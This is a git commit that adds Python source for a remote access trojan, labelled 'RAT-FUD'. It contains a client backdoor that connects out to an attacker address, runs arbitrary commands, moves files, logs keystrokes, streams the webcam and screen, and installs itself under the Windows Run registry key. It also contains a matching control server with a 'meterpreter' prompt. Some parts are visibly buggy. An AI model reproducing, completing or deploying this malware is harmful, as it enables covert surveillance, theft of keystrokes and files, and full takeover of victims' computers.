2e12c0ad6644ac3e2b7fd6cfe9abad5404311de2
Kyuurazz <bilalhafidz17@gmail.com>
2023-02-14 17:00:11 +0700

    Update

---
+++ RAT-FUD/backdoor_resistence.py
@@ -0,0 +1,155 @@
+import sys
+import socket
+import json
+import subprocess
+from subprocess import PIPE
+import os
+from tools.keylogger import KeyLogger
+import threading
+import cv2
+import pickle
+import struct
+import pyautogui
+import pygame
+from PIL import ImageGrab
+import numpy as np
+import shutil
+import time
+
+soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+def data_receive():
+    data = ''
+    while True:
+        try:
+            data = data + soc.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+        
+def file_upload(filename):
+    file = open(filename, 'rb')
+    soc.send(file.read())
+    file.close
+
+def file_download(filename):
+    file = open(filename, 'wb')
+    soc.settimeout(1)
+    _file = soc.recv(1024)
+    while _file:
+        file.write(_file)
+        try:
+            _file = soc.recv(1024)
+        except socket.timeout as e:
+            break
+    soc.settimeout(None)
+    file.close()
+
+def open_log():
+    soc.send(KeyLogger().read_log().encode())
+
+def log_thread():
+    t = threading.Thread(target=open_log)
+    t.start()
+
+def byte_stream():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect(('#', 4444)) # Enter your ip address in '#'
+    vid = cv2.VideoCapture(0)
+    while (vid.isOpened()):
+        img, frame = vid.read()
+        b = pickle.dumps(frame)
+        message = struct.pack("Q", len(b))+b
+        sock.sendall(message)
+
+def send_byte_stream():
+    t = threading.Thread(target=byte_stream)
+    t.start()
+
+def byte_stream_recorder():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect(('#', 8888)) # Enter your ip address in '#'
+
+    screen = pygame.display.set_mode((0,0), pygame.FULLSCREEN)
+    screen = screen.get_size()
+    WIDTH = screen[0]
+    HEIGHT = screen[1]
+
+    while True:
+        img = ImageGrab.grab(bbox=(0,0,WIDTH,HEIGHT))
+        capture = np.array(img)
+        capture = cv2.cvtColor(capture, cv2.COLOR_BGR2RGB)
+        b = pickle.dumps(capture)
+        message = struct.pack("i", len(b))+b
+        sock.sendall(message)
+
+def send_byte_stream_recorder():
+    t = threading.Thread(target=byte_stream_recorder)
+    t.start()
+
+def run_persistence(name_registry, file_executable):
+    file_path = os.environ['appdata'] + '\\' + file_executable
+    try:
+        if not os.path.exists(file_path):
+            shutil.copyfile(sys.executable, file_path)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + name_registry + ' /t REG_SZ /d "' + file_path + '"', shell=True)
+        else:
+            pass
+    except:
+        pass
+
+def run_command():
+    while True:
+        command = data_receive()
+        if command in ('exit', 'quit'):
+            break
+        elif command == 'clear':
+            pass
+        elif command[:3] == 'cd ':
+            os.chdir(command[3:])
+        elif command[:8] == 'download':
+            file_upload(command[9:])  
+        elif command[:6] == 'upload':
+            file_download(command[7:])
+        elif command == 'keylogger_start':
+            KeyLogger().start_logger()
+        elif command == 'keylogger_dump':
+            log_thread()
+        elif command == 'keylogger_stop':
+            KeyLogger().stop_listener()
+        elif command == 'webcam_stream':
+            send_byte_stream()
+        elif command == 'screenshot':
+            ss = pyautogui.screenshot()
+            ss.save('screenshot.png')
+            file_upload('screenshot.png')
+        elif command == 'screenshare':
+            send_byte_stream_recorder()
+        elif command[:11] == 'persistence':
+            name_registry, file_executable = command[12:].split(' ')
+            run_persistence(name_registry, file_executable)
+        else:
+          execute = subprocess.Popen(
+              command,
+              shell = True,
+              stdout = PIPE,
+              stderr = PIPE,
+              stdin = PIPE
+          )
+          data = execute.stdout.read() + execute.stderr.read()
+          data = data.decode()
+          output = json.dumps(data)
+          soc.send(output.encode())
+
+def persistence():
+    while True:
+        try:
+            time.sleep(10)
+            soc.connect(('#', 9999)) # Enter your ip address in '#'
+            run_command()
+            soc.close()
+            break
+        except:
+            run_persistence()
+
+run_persistence()
---
+++ RAT-FUD/server.py
@@ -0,0 +1,162 @@
+import socket
+import json
+import os
+import struct
+import pickle
+import cv2
+import threading
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind(('#', 9999)) # Enter your ip address in '#'
+print('Waiting for connection ...')
+sock.listen(1)
+
+connect = sock.accept()
+_target = connect[0]
+ip = connect[1]
+print(_target)
+print(f'Connected to {str(ip)}')
+
+def data_received():
+    data = ''
+    while True:
+        try:
+            data = data + _target.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+        
+def download_file(filename):
+    file = open(filename, 'wb')
+    _target.settimeout(1)
+    _file = _target.recv(1024)
+    while _file:
+        file.write(_file)
+        try:
+            _file = _target.recv(1024)
+        except socket.timeout as e:
+            break
+    _target.settimeout(None)
+    file.close
+
+def file_upload(filename):
+    file = open(filename, 'rb')
+    _target.send(file.read())
+    file.close
+
+def convert_byte_stream():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind(('#', 4444)) # Enter your ip address in '#'
+    sock.listen(5)
+    connect = sock.accept()
+    target = connect[0]
+    ip = connect[1]
+
+    bdata = b""
+    payload_size = struct.calcsize("Q")
+
+    while True:
+        while (len(bdata)) < payload_size:
+            packet = target.recv(4*1024)
+            if not packet: break
+            bdata + packet
+
+        packed_msg_size = bdata[:payload_size]
+        bdata = bdata[payload_size:]
+        msg_size = struct.unpack("Q", packed_msg_size)[0]
+        while len(bdata) < msg_size:
+            bdata += target.recv(4*1024)
+        frame_data = bdata[:msg_size]
+        bdata = bdata[msg_size:]
+        frame = pickle.loads(frame_data)
+        cv2.imshow("Are recording ...", frame)
+        key = cv2.waitKey(1)
+        if key == 27:
+            break
+    target.close()
+    cv2.destroyAllWindows()
+
+def stream_cam():
+    t = threading.Thread(target=convert_byte_stream)
+    t.start()
+
+def convert_byte_screen_recorder():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind(('#', 8888)) # Enter your ip address in '#'
+    sock.listen(5)
+    connect = sock.accept()
+    target = connect[0]
+    ip = connect[1]
+
+    bdata = b""
+    payload_size = struct.calcsize("i")
+
+    while True:
+        while (len(bdata)) < payload_size:
+            packet = target.recv(1024)
+            if not packet: break
+            bdata + packet   
+        packed_msg_size = bdata[:payload_size]
+        bdata = bdata[payload_size:]
+        msg_size = struct.unpack("i", packed_msg_size)[0]
+        while len(bdata) < msg_size:
+            bdata += target.recv(1024)
+        frame_data = bdata[:msg_size]
+        bdata = bdata[msg_size:]
+        frame = pickle.loads(frame_data)
+        cv2.imshow("Are recording the screen ...", frame)
+        key = cv2.waitKey(1)
+        if key == 27:
+            break
+    target.close()
+    cv2.destroyAllWindows()   
+
+def record_screen():
+    t = threading.Thread(target=convert_byte_screen_recorder)
+    t.start()  
+
+def shell():
+    n = 0
+    while True:
+        command = input('meterpreter > ')
+        data = json.dumps(command)
+        _target.send(data.encode())
+        if command in ('exit', 'quit'):
+            break
+        elif command == 'clear':
+            os.system('clear')
+        elif command[:3] == 'cd ':
+            pass
+        elif command[:8] == 'download':
+            download_file(command[9:])
+        elif command[:6] == 'upload':
+            file_upload(command[7:])
+        elif command == 'keylogger_start':
+            pass
+        elif command == 'keylogger_dump':
+            data = _target.recv(1024).decode()
+            print(data)
+        elif command == 'keylogger_stop':
+            pass
+        elif command == 'webcam_stream':
+            stream_cam()
+        elif command == 'screenshot':
+            n += 1
+            file = open('screenshot'+str(n)+".png", 'wb')
+            _target.settimeout(3)
+            _file = _target.recv(1024)
+            while _file:
+                file.write(_file)
+                try:
+                    _file = _target.recv(1024)
+                except socket.timeout as e:
+                    break
+            _target.settimeout(None)
+            file.close()
+        elif command == 'screenshare':
+            record_screen()
+        else:
+          result = data_received()
+          print(result)
+
+shell()
